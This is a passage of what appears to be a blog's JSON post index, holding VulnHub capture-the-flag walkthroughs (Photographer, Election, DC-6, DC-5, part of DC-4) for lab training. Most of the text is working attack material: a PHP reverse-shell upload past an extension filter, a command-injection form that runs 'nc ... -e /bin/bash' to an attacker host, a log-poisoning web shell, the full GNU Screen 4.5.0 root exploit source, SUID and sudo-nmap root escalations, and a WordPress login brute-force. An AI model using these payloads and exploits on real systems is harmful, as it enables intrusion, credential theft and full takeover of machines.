upload shell on the server. Using Import Content which is at the bottom right-hand side.I saved php-reverse-shell.php with name rev.php.jpg on local machine.Open Koken CMS Dashboard, upload rev.php.jpg using Import Content button and Intercep request in burp.On burp, rename file with rev.php and sent the request.On Koken CMS Library, select you file and put the mouse on “Download File” to see where your file is hosted on server.curl http://192.168.1.7:8000/storage/originals/43/80/rev.php┌─[hitesh@parrot]─[~/boxes/vulnhub/photographer]└──╼ $nc -nvlp 8888listening on [any] 8888 ...connect to [192.168.1.2] from (UNKNOWN) [192.168.1.7] 43852Linux photographer 4.15.0-45-generic #48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:48 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux 01:49:04 up 33 min,  0 users,  load average: 1.13, 1.25, 2.22USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHATuid=33(www-data) gid=33(www-data) groups=33(www-data)/bin/sh: 0: can't access tty; job control turned off$ python -c 'import pty;pty.spawn(\"/bin/bash\")'www-data@photographer:/$ ^Z[1]+  Stopped                 nc -nvlp 8888┌─[✗]─[hitesh@parrot]─[~/boxes/vulnhub/photographer]└──╼ $stty raw -echo┌─[hitesh@parrot]─[~/boxes/vulnhub/photographer]└──╼ $nc -nvlp 8888www-data@photographer:/$ export TERM=xtermwww-data@photographer:/$ User FlagIn home directory of daisa we get user flag.www-data@photographer:/home/daisa$ cat user.txt d41d8cd98f00b204e9800998ecf8427ePrivescLooking at SUID files, /usr/bin/php7.2 seem suspicious to me.www-data@photographer:/tmp$ find / -perm -u=s -type f 2&gt;/dev/null/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/eject/dmcrypt-get-device/usr/lib/xorg/Xorg.wrap/usr/lib/snapd/snap-confine/usr/lib/openssh/ssh-keysign/usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox/usr/lib/policykit-1/polkit-agent-helper-1/usr/sbin/pppd/usr/bin/pkexec/usr/bin/passwd/usr/bin/newgrp/usr/bin/gpasswd/usr/bin/php7.2/usr/bin/sudo/usr/bin/chsh/usr/bin/chfn/bin/ntfs-3g/bin/ping/bin/fusermount/bin/mount/bin/ping6/bin/umount/bin/suGTFObins help me to get shell.www-data@photographer:/tmp$ /usr/bin/php7.2 -r \"pcntl_exec('/bin/sh', ['-p']);\"#Root Flag# cat proof.txt                                                                                                   .:/://::::///:-`                                                            -/++:+`:--:o:  oo.-/+/:`                                                     -++-.`o++s-y:/s: `sh:hy`:-/+:`                                                :o:``oyo/o`. `      ```/-so:+--+/`                                            -o:-`yh//.                 `./ys/-.o/                                          ++.-ys/:/y-                  /s-:/+/:/o`                                       o/ :yo-:hNN                   .MNs./+o--s`                                     ++ soh-/mMMN--.`            `.-/MMMd-o:+ -s                                    .y  /++:NMMMy-.``            ``-:hMMMmoss: +/                                   s-     hMMMN` shyo+:.    -/+syd+ :MMMMo     h                                   h     `MMMMMy./MMMMMd:  +mMMMMN--dMMMMd     s.                                  y     `MMMMMMd`/hdh+..+/.-ohdy--mMMMMMm     +-                                  h      dMMMMd:````  `mmNh   ```./NMMMMs     o.                                  y.     /MMMMNmmmmd/ `s-:o  sdmmmmMMMMN.     h`                                  :o      sMMMMMMMMs.        -hMMMMMMMM/     :o                                    s:     `sMMMMMMMo - . `. . hMMMMMMN+     `y`                                    `s-      +mMMMMMNhd+h/+h+dhMMMMMMd:     `s-                                      `s:    --.sNMMMMMMMMMMMMMMMMMMmo/.    -s.                                         /o.`ohd:`.odNMMMMMMMMMMMMNh+.:os/ `/o`                                           .++-`+y+/:`/ssdmmNNmNds+-/o-hh:-/o-                                               ./+:`:yh:dso/.+-++++ss+h++.:++-                                                    -/+/-:-/y+/d:yh-o:+--/+/:`                                                         `-///////////////:`                                                                                                               Follow me at: http://v1n1v131r4.comd41d8cd98f00b204e9800998ecf8427e"
  },
  
  {
    "title": "Election Walkthrough",
    "url": "/posts/Election-Walkthrough/",
    "categories": "vulnhub, OSCP-Like",
    "tags": "medium, oscp, election, Serv-U, suid",
    "date": "2020-09-04 00:00:00 +0530",
    





    "snippet": "It is an OSCP-like box, where the initial credentials can be found by converting binary to ascii. We found another creds in system log file. Used this creds to access ssh and priv esc to root by exploiting SUID.Summary  Portscan  Use Gobuster find directories.  Binary to ascii  Login to election admin panel.  Finding creds in log file  SSH to box  Priv esc to root using SUID  Root FlagPortscanPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 20:d1:ed:84:cc:68:a5:a7:86:f0:da:b8:92:3f:d9:67 (RSA)|   256 78:89:b3:a2:75:12:76:92:2a:f9:8d:27:c1:08:a7:b9 (ECDSA)|_  256 b8:f4:d6:61:cf:16:90:c5:07:18:99:b0:7c:70:fd:c0 (ED25519)80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Apache2 Ubuntu Default Page: It worksService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelPort 80 website enumerationThe web server displays the default Ubuntu apache page:When running gobuster I found an interesting /election directory.$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.1.8 -x php,txt/index.html (Status: 200)/javascript (Status: 301)/robots.txt (Status: 200)/election (Status: 301)/phpmyadmin (Status: 301)/phpinfo.php (Status: 200)/server-status (Status: 403)/election directory doesn’t appear to contain anything interesting, so I decided to enumerate more.$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.1.8/election -x php,txt/media (Status: 301)/themes (Status: 301)/data (Status: 301)/admin (Status: 301)/index.php (Status: 200)/lib (Status: 301)/languages (Status: 301)/js (Status: 301)/card.php (Status: 200)Binary to AsciiThe card.php contains the binary code.$curl http://192.168.1.8/election/card.php00110000 00110001 00110001 00110001 00110000 00110001 00110000 00110001 00100000 00110000 00110001 00110001 00110001 00110000 00110000 00110001 00110001 00100000 00110000 00110001 00110001 00110000 00110000 00110001 00110000 00110001 00100000 00110000 00110001 00110001 00110001 00110000 00110000 00110001 00110000 00100000 00110000 00110000 00110001 00110001 00110001 00110000 00110001 00110000 00100000 00110000 00110000 00110001 00110001 00110000 00110000 00110000 00110001 00100000 00110000 00110000 00110001 00110001 00110000 00110000 00110001 00110000 00100000 00110000 00110000 00110001 00110001 00110000 00110000 00110001 00110001 00100000 00110000 00110000 00110001 00110001 00110000 00110001 00110000 00110000 00100000 00110000 00110000 00110000 00110000 00110001 00110000 00110001 00110000 00100000 00110000 00110001 00110001 00110001 00110000 00110000 00110000 00110000 00100000 00110000 00110001 00110001 00110000 00110000 00110000 00110000 00110001 00100000 00110000 00110001 00110001 00110001 00110000 00110000 00110001 00110001 00100000 00110000 00110001 00110001 00110001 00110000 00110000 00110001 00110001 00100000 00110000 00110000 00110001 00110001 00110001 00110000 00110001 00110000 00100000 00110000 00110001 00110000 00110001 00110001 00110000 00110001 00110000 00100000 00110000 00110001 00110001 00110001 00110001 00110000 00110000 00110000 00100000 00110000 00110001 00110001 00110000 00110000 00110000 00110001 00110001 00100000 00110000 00110000 00110001 00110001 00110000 00110000 00110000 00110001 00100000 00110000 00110000 00110001 00110001 00110000 00110000 00110001 00110000 00100000 00110000 00110000 00110001 00110001 00110000 00110000 00110001 00110001 00100000 00110000 00110000 00110001 00110000 00110000 00110000 00110000 00110001 00100000 00110000 00110001 00110000 00110000 00110000 00110000 00110000 00110000 00100000 00110000 00110000 00110001 00110000 00110000 00110000 00110001 00110001Convert binary to ascii and we get credentials.user : 1234pass : Zxc123!@#Election Admin PanelUse this to access election panel. Under system info we get log file.The log file contains credentials.$cat system.log [2020-01-01 00:00:00] Assigned Password for the user love: P@$$w0rd@123[2020-04-03 00:13:53] Love added candidate 'Love'.[2020-04-08 19:26:34] Love has been logged in from Unknown IP on Firefox (Linux).username : lovepassword : P@$$w0rd@123SSHWe can use this credentials to access SSH.$ssh love@192.168.1.8love@192.168.1.8's password: Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 5.3.0-46-generic x86_64) * Documentation:  https://help.ubuntu.com * Management:     https://landscape.canonical.com * Support:        https://ubuntu.com/advantage * Kubernetes 1.19 is out! Get it in one command with:     sudo snap install microk8s --channel=1.19 --classic   https://microk8s.io/ has docs and details. * Canonical Livepatch is available for installation.   - Reduce system reboots and improve kernel security. Activate at:     https://ubuntu.com/livepatch74 packages can be updated.28 updates are security updates.Priv esc to rootWhile checking SUID files, /usr/local/Serv-U/Serv-U seem suspicious to me.love@election:~$ find / -perm -4000 2&gt;/dev/null/tmp/usr/bin/arping/usr/bin/passwd/usr/bin/pkexec/usr/bin/traceroute6.iputils/usr/bin/newgrp/usr/bin/chsh/usr/bin/chfn/usr/bin/gpasswd/usr/bin/sudo/usr/sbin/pppd/usr/local/Serv-U/Serv-U/usr/lib/policykit-1/polkit-agent-helper-1/usr/lib/eject/dmcrypt-get-device....../snap/core18/1223/usr/bin/sudo/snap/core18/1223/usr/lib/dbus-1.0/dbus-daemon-launch-helper/snap/core18/1223/usr/lib/openssh/ssh-keysignI checked /usr/local/Serv-U directory and found Serv-U versionlove@election:/usr/local/Serv-U$ cat Serv-U-StartupLog.txt [01] Fri 04Sep20 10:34:20 - Serv-U File Server (64-bit) - Version 15.1 (15.1.6.25) - (C) 2017 SolarWinds Worldwide, LLC.  All rights reserved.[01] Fri 04Sep20 10:34:20 - Build Date: Wednesday, November, 29, 2017 11:28 AM[01] Fri 04Sep20 10:34:20 - Operating System: Linux 64-bit; Version: 5.3.0-46-generic[01] Fri 04Sep20 10:34:20 - Loaded graphics library.[01] Fri 04Sep20 10:34:20 - Unable to load ODBC database libraries.  Install package \"unixODBC\" to use a database within Serv-U.[01] Fri 04Sep20 10:34:20 - Loaded SSL/TLS libraries.[01] Fri 04Sep20 10:34:20 - Loaded SQLite library.[01] Fri 04Sep20 10:34:20 - FIPS 140-2 mode is OFF.[01] Fri 04Sep20 10:34:20 - LICENSE: Running beyond trial period.  Serv-U will no longer accept connections.[01] Fri 04Sep20 10:34:20 - Socket subsystem initialized.[01] Fri 04Sep20 10:34:20 - HTTP server listening on port number 43958, IP 127.0.0.1[01] Fri 04Sep20 10:34:20 - HTTP server listening on port number 43958, IP ::1Here is an exploit I found on searchsploit.$searchsploit Serv-U 15.1-----------------------------------------------------------------------------------------------------  Exploit Title                                                                                       |  Path----------------------------------------------------------------------------------------------------- ---------------------------------Serv-U FTP Server &lt; 15.1.7 - Local Privilege Escalation (1)                                          | linux/local/47009.cServ-U FTP Server &lt; 15.1.7 - Local Privilege Escalation (2)                                          | multiple/local/47173.sh----------------------------------------------------------------------------------------------------- I transfer 47009.c to server and by executing we get root access.$python3 -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...192.168.1.8 - - [04/Sep/2020 12:20:58] \"GET /47009.c HTTP/1.1\" 200 -love@election:/tmp$ wget http://192.168.1.2:8000/47009.c--2020-09-04 12:19:50--  http://192.168.1.2:8000/47009.cConnecting to 192.168.1.2:8000... connected.HTTP request sent, awaiting response... 200 OKLength: 619 [text/plain]Saving to: ‘47009.c’47009.c                           100%[============================================================&gt;]     619  --.-KB/s    in 0s      2020-09-04 12:19:50 (4.39 MB/s) - ‘47009.c’ saved [619/619]love@election:/tmp$ gcc 47009.c -o exploitlove@election:/tmp$ ./exploit uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare),1000(love)opening root shell# iduid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare),1000(love)Flag# cat root.txt5238feefc4ffe09645d97e9ee49bc3a6"
  },
  
  {
    "title": "DC 6 Walkthrough",
    "url": "/posts/DC-6-Walkthrough/",
    "categories": "vulnhub, DC-Series",
    "tags": "medium, nmap, wordpress, bruteforce, sudo",
    "date": "2020-09-01 00:00:00 +0530",
    





    "snippet": "DC-6 was a medium box. First, we add the domain name in the host file to access the website. Using wpscan we find out WordPress users. We Bruteforce and log in to WordPress. With a vulnerable plugin, we get the shell on the box. After pivoting to another user with the credentials found in the things-to-do.txt, we can run nmap as root with Sudo and spawn a shell as root.Summary  Portscan  Add domain to host file  Finding users in wordpress  Generating Password file  Bruteforce  Login to wordpress  Exploiting vulnerable plugin.  Finding Credentials  SSH to box  SUDO rights  Exploiting Nmap  Root access  The FlagPortscanNmap scan report for 192.168.1.7Host is up (0.00020s latency).Not shown: 998 closed portsPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)| ssh-hostkey: |   2048 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd (RSA)|   256 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f (ECDSA)|_  256 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee (ED25519)80/tcp open  http    Apache httpd 2.4.25 ((Debian))|_http-server-header: Apache/2.4.25 (Debian)|_http-title: Did not follow redirect to http://wordy/|_https-redirect: ERROR: Script execution failed (use -d to debug)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelWebsiteWhen we browse the website with its IP address, it redirects us to wordy so I will add this domain name to my local host file i.e /etc/passwd and use the hostname instead.$ cat /etc/hosts127.0.0.1\tlocalhost127.0.1.1\tparrot#vulnhub192.168.1.7     wordy# The following lines are desirable for IPv6 capable hosts::1     localhost ip6-localhost ip6-loopbackff02::1 ip6-allnodesff02::2 ip6-allroutersWe discovered the webpage got a WordPress CMS installed on it.Finding usersI run wpscan to enumerate WordPress site. As a result, I found 4 users.$wpscan --url http://wordy -eu[i] User(s) Identified:[+] admin | Found By: Rss Generator (Passive Detection) | Confirmed By: |  Wp Json Api (Aggressive Detection) |   - http://wordy/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection) |  Login Error Messages (Aggressive Detection)[+] jens | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)[+] graham | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)[+] mark | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)[+] sarah | FoundBy: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)Genrating Password list.The author of the box DCAU gave the clue on website. Let’s use it to generate password file.cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt BruteforceNow we have usernames and passwords, use this to bruteforce WordPress.$wfuzz -c --hc=200 -z file,users.txt -z file,password.txt -d 'log=FUZZ&amp;pwd=FUZ2Z&amp;wp-submit=Log+In' http://wordy/wp-login.phpWarning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.********************************************************* Wfuzz 2.4.5 - The Web Fuzzer                         *********************************************************Target: http://wordy/wp-login.phpTotal requests: 13340===================================================================ID           Response   Lines    Word     Chars       Payload                                                               ===================================================================000009879:   302        0 L      0 W      0 Ch        \"mark - helpdesk01\"                                                   Great, we got the password of the user mark.username : markpassworc : helpdesk01Use this password to access wordpress.Exploting wordpress pluginWe can see a plugin Activity monitor. There is an exploit available for this plugin you can check here. This plugin is vulnerable to OS command injection.We have to modify our POST request in order to make it work.&lt;html&gt;  &lt;body&gt;  &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;    &lt;form action=\"http://wordy/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools\" method=\"POST\" enctype=\"multipart/form-data\"&gt;      &lt;input type=\"hidden\" name=\"ip\" value=\"google.fr| nc 192.168.1.2 4444 -e /bin/bash\" /&gt;      &lt;input type=\"hidden\" name=\"lookup\" value=\"Lookup\" /&gt;      &lt;input type=\"submit\" value=\"Submit request\" /&gt;    &lt;/form&gt;  &lt;/body&gt;&lt;/html&gt;Save the above file with .html extension and through the browser navigate into the html file by setting python http server.Setup listener and by clicking button we get shell.┌─[✗]─[hitesh@parrot]─[~/boxes/vulnhub/dc-6]└──╼ $nc -nvlp 4444listening on [any] 4444 ...connect to [192.168.1.2] from (UNKNOWN) [192.168.1.7] 54436python -c 'import pty;pty.spawn(\"/bin/bash\")'www-data@dc-6:/var/www/html/wp-admin$ ^Z[1]+  Stopped                 nc -nvlp 4444┌─[✗]─[hitesh@parrot]─[~/boxes/vulnhub/dc-6]└──╼ $stty raw -echo ┌─[hitesh@parrot]─[~/boxes/vulnhub/dc-6]└──╼ $nc -nvlp 4444www-data@dc-6:/var/www/html/wp-admin$ export TERM=xtermwww-data@dc-6:/var/www/html/wp-admin$ Escalating to user grahamIn home directory of user mark I find out things-to-do.txt. This file contains password of user graham.www-data@dc-6:/home/mark/stuff$ cat things-to-do.txt Things to do:- Restore full functionality for the hyperdrive (need to speak to Jens)- Buy present for Sarah's farewell party- Add new user: graham - GSo7isUM1D4 - done- Apply for the OSCP course- Buy new laptop for Sarah's replacementusername : grahampassword : GSo7isUM1D4Privilege EscalationPort 22 is open for ssh and here I try to connect with ssh using creds. Then checked the sudoers list and found that graham can run /home/jens/backups.sh as jens without a password.graham@dc-6:~$ sudo -lMatching Defaults entries for graham on dc-6:    env_reset, mail_badpass,    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser graham may run the following commands on dc-6:    (jens) NOPASSWD: /home/jens/backups.shI checked backups.sh and we can edit this file. Edit this file and get shell as jens.graham@dc-6:~$ cat /home/jens/backups.sh #!/bin/bashtar -czf backups.tar.gz /var/www/htmlgraham@dc-6:~$ vi /home/jens/backups.sh graham@dc-6:~$ cat /home/jens/backups.sh #!/bin/bashtar -czf backups.tar.gz /var/www/html/bin/bashgraham@dc-6:~$ sudo -u jens /home/jens/backups.sh jens@dc-6:/home/graham$Now we successfully login as jeans.Again I checked the sudoers list and found that jens can run /usr/bin/nmap as root without a password.Looking at GTFObins, I see as easy way to get a shell as root.jens@dc-6:~$ TF=$(mktemp)jens@dc-6:~$ echo 'os.execute(\"/bin/sh\")' &gt; $TFjens@dc-6:~$ sudo /usr/bin/nmap --script=$TFStarting Nmap 7.40 ( https://nmap.org ) at 2020-09-01 21:26 AESTNSE: Warning: Loading '/tmp/tmp.SOPgLECyvv' -- the recommended file extension is '.nse'.#bashroot@dc-6:~# The flagroot@dc-6:~# Yb        dP 888888 88     88         8888b.   dP\"Yb  88b 88 888888 d8b  Yb  db  dP  88__   88     88          8I  Yb dP   Yb 88Yb88 88__   Y8P   YbdPYbdP   88\"\"   88  .o 88  .o      8I  dY Yb   dP 88 Y88 88\"\"   `\"'    YP  YP    888888 88ood8 88ood8     8888Y\"   YbodP  88  Y8 888888 (8) Congratulations!!!Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all thosewho have provided feedback, and who have taken time to complete these littlechallenges.If you enjoyed this CTF, send me a tweet via @DCAU7."
  },
  
  {
    "title": "DC 5 Walkthrough",
    "url": "/posts/DC-5-walkthrough/",
    "categories": "vulnhub, DC-Series",
    "tags": "dc-5, medium, suid, lfi, log poisoning, screen",
    "date": "2020-08-31 00:00:00 +0530",
    





    "snippet": "DC-5 starts with discovery of a relatively obvious local file include vulnerability drives us towards a web shell via log poisoning. Once we land a shell, we search for SUID binaries and priv esc to root by exploiting screen-4.5.0 SUID binary. Enjoy this write up as much as I enjoyed writing it!Summary  Portscan  Fuzzing LFI parameter  Reading files using LFI  Web Shell via Log Poisoning  Getting reverse shell  Finding SUID  Privilege Escalation by exploiting screen-4.5.0  Root shell  The FlagPortscanNmap scan report for 192.168.1.7Host is up (0.00061s latency).Not shown: 998 closed portsPORT    STATE SERVICE VERSION80/tcp  open  http    nginx 1.6.2|_http-server-header: nginx/1.6.2|_http-title: Welcome111/tcp open  rpcbind 2-4 (RPC #100000)| rpcinfo: |   program version    port/proto  service|   100000  2,3,4        111/tcp   rpcbind|   100000  2,3,4        111/udp   rpcbind|   100000  3,4          111/tcp6  rpcbind|   100000  3,4          111/udp6  rpcbind|   100024  1          35668/tcp   status|   100024  1          52987/tcp6  status|   100024  1          53084/udp6  status|_  100024  1          57579/udp   statusWebsiteWhen we browse the website with its IP address, it conatins some static pages.GobusterI use gobuster to findout files and directories.$gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.1.7 -x php,html,txt -o go-main.out===============================================================Gobuster v3.0.1by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)===============================================================[+] Url:            http://192.168.1.7[+] Threads:        10[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt[+] Status codes:   200,204,301,302,307,401,403[+] User Agent:     gobuster/3.0.1[+] Extensions:     php,html,txt[+] Timeout:        10s===============================================================2020/08/30 19:26:34 Starting gobuster===============================================================/images (Status: 301)/index.php (Status: 200)/contact.php (Status: 200)/faq.php (Status: 200)/solutions.php (Status: 200)/footer.php (Status: 200)/css (Status: 301)/about-us.php (Status: 200)/thankyou.php (Status: 200)Finding LFIAfter visiting these pages several times, I noticed that the copyright year in thankyou.php gets changed every time I refresh the page.So I decided to FUZZ the website.$wfuzz --hh 851 -w ~/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -u http://192.168.1.7/thankyou.php?FUZZ=Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.********************************************************* Wfuzz 2.4.5 - The Web Fuzzer                         *********************************************************Target: http://192.168.1.7/thankyou.php?FUZZ=Total requests: 2588===================================================================ID           Response   Lines    Word     Chars       Payload        ===================================================================000000010:   200        42 L     63 W     835 Ch      \"file\"         Total time: 5.193434Processed Requests: 2588Filtered Requests: 2587Requests/sec.: 498.3215Here I found the file parameter and using it we can read files too.Web Shell via Log PoisoningLog Poisoning is to put some php into the logs, and then load using lfi. We know that nginx server stored logs in /var/log/ngnix/error.log. The easy way would be to add php code in url it will get written in the log file and then access it with lfi.Inject the PHP codeI inject the php code to get the command line access by making a GET request to the server.&lt;?php system($_GET['cmd']) ?&gt;Getting reverse shellTo get code execution on site I added cmd parameter to URL.It looks like this  http://192.168.1.6/thankyou.php?file=/var/log/nginx/error.log&amp;cmd=idWe can execute any system command on server using it. I execute reverse shell.┌─[hitesh@parrot]─[~/boxes/vulnhub/dc-5]└──╼ $nc -nvlp 4444listening on [any] 4444 ...connect to [192.168.1.2] from (UNKNOWN) [192.168.1.6] 58309python -c 'import pty;pty.spawn(\"/bin/bash\")'www-data@dc-5:~/html$ ^Z[1]+  Stopped                 nc -nvlp 4444┌─[✗]─[hitesh@parrot]─[~/boxes/vulnhub/dc-5]└──╼ $stty raw -echo┌─[hitesh@parrot]─[~/boxes/vulnhub/dc-5]└──╼ $nc -nvlp 4444www-data@dc-5:~/html$ export TERM=xtermPrivesc to RootLooking at SUID files, /bin/screen-4.5.0 seem suspicious to me.www-data@dc-5:~/html$ find / -perm -4000 2&gt;/dev/null/bin/su/bin/mount/bin/umount/bin/screen-4.5.0/usr/bin/gpasswd/usr/bin/procmail/usr/bin/at/usr/bin/passwd/usr/bin/chfn/usr/bin/newgrp/usr/bin/chsh/usr/lib/openssh/ssh-keysign/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/eject/dmcrypt-get-device/usr/sbin/exim4/sbin/mount.nfsHere is an exploit I found on searchsploit.$searchsploit screen 4.5.0----------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title                                                                                       |  Path----------------------------------------------------------------------------------------------------- ---------------------------------GNU Screen 4.5.0 - Local Privilege Escalation                                                        | linux/local/41154.shGNU Screen 4.5.0 - Local Privilege Escalation (PoC)                                                  | linux/local/41152.txt----------------------------------------------------------------------------------------------------- ---------------------------------Shellcodes: No ResultsThe exploit has 3 steps. Two compile and one is exploit.The files are1. libhax.c#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;__attribute__ ((__constructor__))void dropshell(void){    chown(\"/tmp/rootshell\", 0, 0);    chmod(\"/tmp/rootshell\", 04755);    unlink(\"/etc/ld.so.preload\");    printf(\"[+] done!\\n\");}2. rootshell.c#include &lt;stdio.h&gt;int main(void){    setuid(0);    setgid(0);    seteuid(0);    setegid(0);    execvp(\"/bin/sh\", NULL, NULL);}3. 41154.shcd /etcumask 000 # becausescreen -D -m -L ld.so.preload echo -ne  \"\\x0a/tmp/libhax.so\" # newline neededecho \"[+] Triggering...\"screen -ls # screen itself is setuid, so... /tmp/rootshellRun libhax.c and rootshell.c on local machine$gcc -fPIC -shared -ldl -o libhax.so libhax.clibhax.c: In function ‘dropshell’:libhax.c:7:5: warning: implicit declaration of function ‘chmod’ [-Wimplicit-function-declaration]    7 |     chmod(\"/tmp/rootshell\", 04755);      |     ^~~~~$gcc -o rootshell rootshell.crootshell.c: In function ‘main’:rootshell.c:3:5: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]    3 |     setuid(0);      |     ^~~~~~rootshell.c:4:5: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]    4 |     setgid(0);      |     ^~~~~~rootshell.c:5:5: warning: implicit declaration of function ‘seteuid’ [-Wimplicit-function-declaration]    5 |     seteuid(0);      |     ^~~~~~~rootshell.c:6:5: warning: implicit declaration of function ‘setegid’ [-Wimplicit-function-declaration]    6 |     setegid(0);      |     ^~~~~~~rootshell.c:7:5: warning: implicit declaration of function ‘execvp’ [-Wimplicit-function-declaration]    7 |     execvp(\"/bin/sh\", NULL, NULL);      |     ^~~~~~rootshell.c:7:5: warning: too many arguments to built-in function ‘execvp’ expecting 2 [-Wbuiltin-declaration-mismatch]Now we have total 5 files. For simplicity I compress them to tranfer to server.$ls41154.sh  libhax.c  libhax.so  rootshell  rootshell.c$tar -zcvf exploit.tar.gz *41154.shlibhax.clibhax.sorootshellrootshell.cTranfer exploit.tar.gz to server and decompress the files.$python3 -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...192.168.1.6 - - [31/Aug/2020 14:13:17] \"GET /exploit.tar.gz HTTP/1.1\" 200 -www-data@dc-5:/tmp$ wget http://192.168.1.2:8000/exploit.tar.gzconverted 'http://192.168.1.2:8000/exploit.tar.gz' (ANSI_X3.4-1968) -&gt; 'http://192.168.1.2:8000/exploit.tar.gz' (UTF-8)--2020-08-31 18:43:15--  http://192.168.1.2:8000/exploit.tar.gzConnecting to 192.168.1.2:8000... connected.HTTP request sent, awaiting response... 200 OKLength: 4430 (4.3K) [application/gzip]Saving to: 'exploit.tar.gz'exploit.tar.gz      100%[=====================&gt;]   4.33K  --.-KB/s   in 0s     2020-08-31 18:43:15 (474 MB/s) - 'exploit.tar.gz' saved [4430/4430]www-data@dc-5:/tmp$ lsexploit.tar.gzwww-data@dc-5:/tmp$ tar -zxvf exploit.tar.gz 41154.shlibhax.clibhax.sorootshellrootshell.cwww-data@dc-5:/tmp$ ls41154.sh  exploit.tar.gz  libhax.c  libhax.so  rootshell  rootshell.cAt last grant permission and execute the exploit.www-data@dc-5:/tmp$ chmod +x 41154.sh www-data@dc-5:/tmp$ ./41154.sh [+] Triggering...' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.[+] done!No Sockets found in /tmp/screens/S-www-data.# iduid=0(root) gid=0(root) groups=0(root),33(www-data)The Flag# cat thisistheflag.txt888b    888 d8b                                                      888      888 888 888 8888b   888 Y8P                                                      888      888 888 888 88888b  888                                                          888      888 888 888 888Y88b 888 888  .d8888b .d88b.       888  888  888  .d88b.  888d888 888  888 888 888 888 888 Y88b888 888 d88P\"   d8P  Y8b      888  888  888 d88\"\"88b 888P\"   888 .88P 888 888 888 888  Y88888 888 888     88888888      888  888  888 888  888 888     888888K  Y8P Y8P Y8P 888   Y8888 888 Y88b.   Y8b.          Y88b 888 d88P Y88..88P 888     888 \"88b  \"   \"   \"  888    Y888 888  \"Y8888P \"Y8888        \"Y8888888P\"   \"Y88P\"  888     888  888 888 888 888                                                                                                                                                                                     Once again, a big thanks to all those who do these little challenges,and especially all those who give me feedback - again, it's all greatlyappreciated.  :-)I also want to send a big thanks to all those who find the vulnerabilitiesand create the exploits that make these challenges possible."
  },
  
  {
    "title": "DC 4 Walkthrough",
    "url": "/posts/DC-4-Walkthrough/",
    "categories": "vulnhub, DC-Series",
    "tags": "dc-4, easy, teehee",
    "date": "2020-08-28 00:00:00 +0530",
    





    "snippet": "DC-4 is a good beginner-friendly box. We bruteforce the website and get admin password. with the help of OS command injection vulnerability get shell on box. The old-password list gives password of user jim and mail from charles gives another password. We get root by adding user in /etc/passwd file using teehee.Summary  Portscan  Bruteforce site to get admin password  Command Injection  Bruteforce SSH  Find password from mail  Check Sudoers  Add new user using teehee  Root access  The FlagReconPortscanNmap scan report for 192.168.1.8Host is up (0.00020s latency).Not shown: 998 closed portsPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)| ssh-hostkey: |   2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 (RSA)|   256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 (ECDSA)|_  256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b (ED25519)80/tcp open  http    nginx 1.15.10|_http-server-header: nginx/1.15.10|_http-title: System ToolsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelWebsiteWe have a login page on the website with title Admin 